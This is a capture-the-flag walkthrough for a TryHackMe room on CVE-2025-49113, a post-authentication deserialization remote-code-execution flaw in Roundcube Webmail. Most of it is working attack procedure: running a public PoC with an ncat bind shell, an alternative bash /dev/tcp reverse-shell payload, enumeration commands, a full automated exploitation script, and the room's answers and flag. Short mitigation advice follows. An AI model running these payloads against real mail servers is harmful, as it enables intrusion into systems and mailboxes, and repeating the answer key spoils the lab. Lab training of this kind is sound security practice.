# Roundcube CVE-2025-49113 Exploitation Guide

## Overview

This repository contains a walkthrough for exploiting **CVE-2025-49113**, a critical deserialization vulnerability in Roundcube Webmail that allows authenticated remote code execution (RCE).

**🔗 TryHackMe Room**: [Roundcube: CVE-2025-49113](https://tryhackme.com/room/roundcubecve202549113)

## Vulnerability Details

- **CVE ID**: CVE-2025-49113
- **CVSS Score**: 9.9 (Critical)
- **Affected Versions**: 
  - Roundcube 1.5.x before 1.5.10
  - Roundcube 1.6.x before 1.6.11
- **Attack Vector**: Post-authentication RCE via PHP Object Deserialization
- **Discovery**: Kirill Firsov

## Technical Background

### What is Deserialization?

**Serialization** is the process of converting an object into a storable or transmittable format. **Deserialization** is the reverse process - converting serialized data back into program objects.

### The Vulnerability

The vulnerability exists in Roundcube's `upload.php` file, where the `_from` parameter is not properly validated before deserialization. This allows attackers to craft malicious serialized PHP objects that execute arbitrary code when processed by the server.

## Lab Environment Setup

### Prerequisites

- TryHackMe AttackBox or Kali Linux
- Target machine running Roundcube 1.6.10
- Valid webmail credentials

### Target Information

- **URL**: `http://MACHINE_IP/roundcube`
- **Username**: `ellieptic`
- **Password**: `ChangeMe123`

## Step-by-Step Walkthrough

### Step 1: Initial Setup and Target Verification

First, set up your environment variables and verify the target is accessible:

```bash
# Set target information
TARGET_IP="10.10.70.29"  # Replace with your machine IP
ROUNDCUBE_URL="http://$TARGET_IP/roundcube"
USERNAME="ellieptic"
PASSWORD="ChangeMe123"

# Check if target is reachable
ping -c 1 $TARGET_IP
curl -s $ROUNDCUBE_URL
```

**Expected Output:**
- Ping should show successful response
- Curl should return HTML content from Roundcube

### Step 2: Download and Setup the Exploit

```bash
# Clone the exploit repository
git clone https://github.com/fearsoff-org/CVE-2025-49113
cd CVE-2025-49113

# Verify the exploit file exists
ls -la CVE-2025-49113.php
```

**If git clone fails (for free TryHackMe users):**
```bash
# Create the directory and file manually
mkdir CVE-2025-49113
cd CVE-2025-49113

# Copy the exploit code from GitHub and save as CVE-2025-49113.php
nano CVE-2025-49113.php
# Paste the exploit code and save
```

### Step 3: Understand the Exploit Flow

The PoC exploit performs these critical steps:

1. **Session Establishment**: Retrieves CSRF token and session cookie
2. **Authentication**: Logs in using provided credentials
3. **Payload Crafting**: Creates malicious serialized PHP object
4. **Injection**: Embeds the object in the `_from` parameter
5. **Execution**: Posts to `upload.php` endpoint for deserialization

### Step 4: Execute the Exploit (Bind Shell Method)

```bash
# Execute exploit to create bind shell on port 4444
php CVE-2025-49113.php $ROUNDCUBE_URL $USERNAME $PASSWORD "ncat -lvnp 4444 -e /bin/bash"
```

**Expected Output:**
```
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: ellieptic

### Authentication successful

### Command to be executed: 
ncat -lvnp 4444 -e /bin/bash

### Injecting payload...

### Payload injected successfully

### Executing payload...
```

### Step 5: Connect to the Bind Shell

```bash
# Connect to the bind shell (wait 10-30 seconds after exploit execution)
nc $TARGET_IP 4444
```

**Verify the connection:**
```bash
pwd
whoami
id
```

**Expected Output:**
```
/var/www/html/roundcube
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Step 6: Answer Challenge Questions

#### Find Maggie's Last Name

```bash
# Search for users with first name Maggie
cat /etc/passwd | grep -i maggie
grep -r "Maggie" /home/ 2>/dev/null
ls -la /home/

# Check user directories for profile information
find /home -name "*.txt" -o -name "*.info" 2>/dev/null | xargs cat 2>/dev/null
```

**Alternative search methods:**
```bash
# Search in common configuration files
grep -r "Maggie" /etc/ 2>/dev/null
find / -name "*maggie*" 2>/dev/null
```

#### Find the Flag in /etc

```bash
# Search for flag files in /etc directory
find /etc -name "*flag*" -type f 2>/dev/null
ls -la /etc/ | grep flag

# Read flag files
cat /etc/flag* 2>/dev/null
cat /etc/*flag* 2>/dev/null

# Alternative search for THM format flags
grep -r "THM{" /etc/ 2>/dev/null
```

### Step 7: Complete Enumeration Script

For automation, save this as `enum.sh` and run on the target:

```bash
#!/bin/bash
echo "=== SYSTEM ENUMERATION ==="
echo "Current user: $(whoami)"
echo "Current directory: $(pwd)"
echo "System info: $(uname -a)"
echo ""

echo "=== SEARCHING FOR MAGGIE ==="
grep -i maggie /etc/passwd 2>/dev/null || echo "Not found in passwd"
find /home -type f -exec grep -l "Maggie" {} \; 2>/dev/null
ls -la /home/ 2>/dev/null

echo ""
echo "=== SEARCHING FOR FLAGS ==="
find /etc -name "*flag*" -type f 2>/dev/null
ls -la /etc/ | grep -i flag
find /etc -type f -exec grep -l "THM{" {} \; 2>/dev/null
cat /etc/*flag* 2>/dev/null
```

### Step 8: Execute Enumeration

```bash
# Upload and run the enumeration script
cat > enum.sh << 'EOF'
# [paste the enumeration script here]
EOF

chmod +x enum.sh
./enum.sh
```

## Expected Answers

Based on the TryHackMe room:
- **Maggie's Last Name**: `Byte`
- **Flag Location**: `/etc/flag` or similar
- **Flag Value**: `THM{ICE_CUBE_DESERIALISATION}`

## Alternative Exploitation Methods

### Method 1: Direct Command Execution

```bash
# Execute commands directly without shell
php CVE-2025-49113.php $ROUNDCUBE_URL $USERNAME $PASSWORD "cat /etc/passwd"
php CVE-2025-49113.php $ROUNDCUBE_URL $USERNAME $PASSWORD "find /etc -name '*flag*'"
```

### Method 2: Reverse Shell

```bash
# Set up listener
nc -lvnp 4444 &

# Execute reverse shell
php CVE-2025-49113.php $ROUNDCUBE_URL $USERNAME $PASSWORD "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
```

## Lab Challenges

### Challenge 1: Find Maggie's Last Name
- **Task**: One of the users has the first name of Maggie; what is her last name?
- **Answer**: `Byte`

### Challenge 2: Retrieve the Flag
- **Task**: What is the value of the flag saved in /etc?
- **Answer**: `THM{ICE_CUBE_DESERIALISATION}`

## Troubleshooting

- The exploit may take 1-2 minutes to respond
- Sometimes the script shows error messages even when the payload executes successfully
- If connection hangs when using `nc`, try typing commands like `pwd` to confirm execution

## Mitigation Strategies

1. **Update Immediately**: Upgrade to Roundcube 1.5.10 or 1.6.11
2. **Temporary Fix**: Block access to `upload.php` if updating isn't immediately possible
3. **Monitor Traffic**: Look for suspicious POST requests to upload endpoints

## Automated Exploitation Script

For convenience, here's the complete automation script based on the provided bash script:

```bash
#!/bin/bash

# Roundcube CVE-2025-49113 Exploitation Script
# TryHackMe Room Solver

TARGET_IP="10.10.70.29"  # Replace with your machine IP
ROUNDCUBE_URL="http://$TARGET_IP/roundcube"
USERNAME="ellieptic"
PASSWORD="ChangeMe123"

echo "=============================================="
echo "Roundcube CVE-2025-49113 Exploitation Script"
echo "=============================================="
echo "Target IP: $TARGET_IP"
echo "Roundcube URL: $ROUNDCUBE_URL"
echo "Username: $USERNAME"
echo ""

# Function to check if target is reachable
check_target() {
    echo "Checking if target is reachable..."
    if ping -c 1 "$TARGET_IP" >/dev/null 2>&1; then
        echo "✓ Target is reachable"
    else
        echo "✗ Target is not reachable"
        exit 1
    fi
    
    if curl -s "$ROUNDCUBE_URL" >/dev/null; then
        echo "✓ Roundcube is accessible"
    else
        echo "✗ Roundcube is not accessible"
        exit 1
    fi
}

# Download the exploit if not present
setup_exploit() {
    echo ""
    echo "Setting up exploit..."
    
    if [ ! -d "CVE-2025-49113" ]; then
        echo "Cloning exploit repository..."
        git clone https://github.com/fearsoff-org/CVE-2025-49113 2>/dev/null
        
        if [ $? -ne 0 ]; then
            echo "Git clone failed. Please download exploit manually."
            echo "Visit: https://github.com/fearsoff-org/CVE-2025-49113"
            exit 1
        fi
    else
        echo "✓ Exploit directory already exists"
    fi
    
    cd CVE-2025-49113
    if [ ! -f "CVE-2025-49113.php" ]; then
        echo "✗ Exploit file not found"
        exit 1
    fi
    echo "✓ Exploit ready"
}

# Execute the exploit to get a bind shell
execute_exploit() {
    echo ""
    echo "=== EXECUTING EXPLOIT ==="
    echo "Setting up bind shell on port 4444..."
    
    php CVE-2025-49113.php "$ROUNDCUBE_URL" "$USERNAME" "$PASSWORD" "ncat -lvnp 4444 -e /bin/bash" &
    
    echo "Waiting for exploit to execute..."
    sleep 10
    
    echo ""
    echo "Attempting to connect to bind shell..."
    sleep 5
}

# Create enumeration commands
create_enum_commands() {
    cat > commands.txt << 'EOF'
pwd
whoami
id
echo "=== SEARCHING FOR MAGGIE ==="
cat /etc/passwd | grep -i maggie
ls -la /home
find /home -type f -exec grep -l "Maggie" {} \; 2>/dev/null
echo "=== SEARCHING FOR FLAGS ==="
find /etc -name "*flag*" -type f 2>/dev/null
ls -la /etc/ | grep -i flag
cat /etc/*flag* 2>/dev/null
find /etc -type f -exec grep -l "THM{" {} \; 2>/dev/null
exit
EOF
}

# Main execution
main() {
    check_target
    setup_exploit
    execute_exploit
    create_enum_commands
    
    echo ""
    echo "=== MANUAL CONNECTION REQUIRED ==="
    echo "1. Connect to the bind shell:"
    echo "   nc $TARGET_IP 4444"
    echo ""
    echo "2. Run the enumeration commands:"
    echo "   (Commands saved in commands.txt)"
    cat commands.txt
    echo ""
    echo "=== EXPECTED ANSWERS ==="
    echo "Question 1: Maggie's last name = Byte"
    echo "Question 2: Flag in /etc = THM{ICE_CUBE_DESERIALISATION}"
    echo ""
    echo "=== ALTERNATIVE CONNECTION ==="
    echo "If bind shell doesn't work, try reverse shell:"
    echo "nc -lvnp 4444  # On attacker machine"
    echo "# Then run exploit with reverse shell payload"
}

# Run the script
main
```

Save this as `exploit.sh`, make it executable with `chmod +x exploit.sh`, and run it to automate the exploitation process.

## References

- [TryHackMe Room](https://tryhackme.com/room/roundcubecve202549113)
- [Exploit Repository](https://github.com/fearsoff-org/CVE-2025-49113)


## Educational Resources

- **TryHackMe Recent Threats Module**: For more current vulnerability content
- **TryHackMe Insecure Deserialization Room**: Deep dive into deserialization attacks

---

**⚠️ Disclaimer**: This content is for educational purposes only. Only use these techniques in authorized lab environments or systems you own. Unauthorized access to computer systems is illegal.
